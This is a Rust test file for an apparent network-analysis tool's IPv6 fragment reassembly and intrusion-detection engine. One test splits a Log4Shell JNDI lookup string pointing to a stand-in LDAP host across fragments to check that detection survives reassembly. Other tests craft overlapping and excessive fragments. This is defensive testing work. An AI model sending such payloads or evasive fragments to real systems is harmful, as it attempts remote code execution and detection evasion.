use packrat_tui::analysis::ipv6_fragments::{Ipv6FragmentOutcome, Ipv6FragmentReassembler};
use packrat_tui::net::packet::Packet;
use packrat_tui::net::security::SecurityEngine;

fn fragment_packet(no: u64, identification: u32, offset: u16, more: bool, payload: &[u8]) -> Packet {
    assert_eq!(offset % 8, 0);
    let mut bytes = vec![0_u8; 14 + 40 + 8];
    bytes[..6].copy_from_slice(&[0x33, 0x33, 0, 0, 0, 1]);
    bytes[6..12].copy_from_slice(&[0, 1, 2, 3, 4, 5]);
    bytes[12..14].copy_from_slice(&0x86dd_u16.to_be_bytes());
    bytes[14] = 0x60;
    bytes[18..20].copy_from_slice(&((8 + payload.len()) as u16).to_be_bytes());
    bytes[20] = 44;
    bytes[21] = 64;
    bytes[22..38].copy_from_slice(&[0x20, 1, 0x0d, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]);
    bytes[38..54].copy_from_slice(&[0x20, 1, 0x0d, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2]);
    bytes[54] = 6;
    let offset_flags = offset | u16::from(more);
    bytes[56..58].copy_from_slice(&offset_flags.to_be_bytes());
    bytes[58..62].copy_from_slice(&identification.to_be_bytes());
    bytes.extend_from_slice(payload);
    Packet {
        no,
        timestamp: no as f64,
        src: "2001:db8::1".into(),
        dst: "2001:db8::2".into(),
        protocol: "IPv6-Frag".into(),
        length: bytes.len() as u16,
        info: String::new(),
        src_port: None,
        dst_port: None,
        vlan_id: None,
        vlan_pcp: None,
        vlan_dei: None,
        outer_vlan_id: None,
        bytes,
    }
}

#[test]
fn reassembles_ipv6_fragments_arriving_out_of_order() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    let last = fragment_packet(1, 7, 16, false, b"qrstuvwx");
    let first = fragment_packet(2, 7, 0, true, b"abcdefghijklmnop");
    assert!(matches!(reassembler.ingest(&last), Ipv6FragmentOutcome::Pending { .. }));
    match reassembler.ingest(&first) {
        Ipv6FragmentOutcome::Complete { datagram, conflicting_overlap } => {
            assert!(!conflicting_overlap);
            assert_eq!(datagram.payload, b"abcdefghijklmnopqrstuvwx");
            assert_eq!(datagram.fragment_count, 2);
        }
        outcome => panic!("unexpected outcome: {outcome:?}"),
    }
}

#[test]
fn distinguishes_identical_retransmission_from_conflicting_overlap() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    let first = fragment_packet(1, 8, 0, true, b"abcdefghijklmnop");
    assert!(matches!(reassembler.ingest(&first), Ipv6FragmentOutcome::Pending { conflicting_overlap: false, .. }));
    assert!(matches!(reassembler.ingest(&first), Ipv6FragmentOutcome::Pending { conflicting_overlap: false, .. }));
    let conflict = fragment_packet(2, 8, 8, true, b"XXXXXXXX");
    assert!(matches!(reassembler.ingest(&conflict), Ipv6FragmentOutcome::Pending { conflicting_overlap: true, .. }));
}

#[test]
fn security_reports_conflicting_ipv6_fragments() {
    let mut security = SecurityEngine::default();
    security.update(&fragment_packet(1, 11, 0, true, b"abcdefghijklmnop"));
    security.update(&fragment_packet(2, 11, 8, true, b"XXXXXXXX"));
    assert!(security
        .ids_alerts
        .iter()
        .any(|alert| alert.signature == "Conflicting IPv6 fragments"));
}

#[test]
fn reassembled_ipv6_payload_runs_through_security_signatures() {
    let payload = b"\x13\x88\x01\xbbabcdefghijkl${jndi:ldap://example.test/x}";
    let split = 24;
    let mut security = SecurityEngine::default();
    security.update(&fragment_packet(1, 9, 0, true, &payload[..split]));
    security.update(&fragment_packet(2, 9, split as u16, false, &payload[split..]));

    assert_eq!(security.ipv6_reassembled, 1);
    assert!(security.ids_alerts.iter().any(|alert| alert.signature == "Log4Shell (CVE-2021-44228)"));
}

#[test]
fn rejects_excessive_ipv6_fragment_count() {
    let mut security = SecurityEngine::default();
    for index in 0..=128_u64 {
        let payload = [(index & 0xff) as u8; 8];
        security.update(&fragment_packet(index + 1, 10, 0, true, &payload));
    }
    assert!(security
        .ids_alerts
        .iter()
        .any(|alert| alert.signature == "IPv6 fragment reassembly rejected"));
}
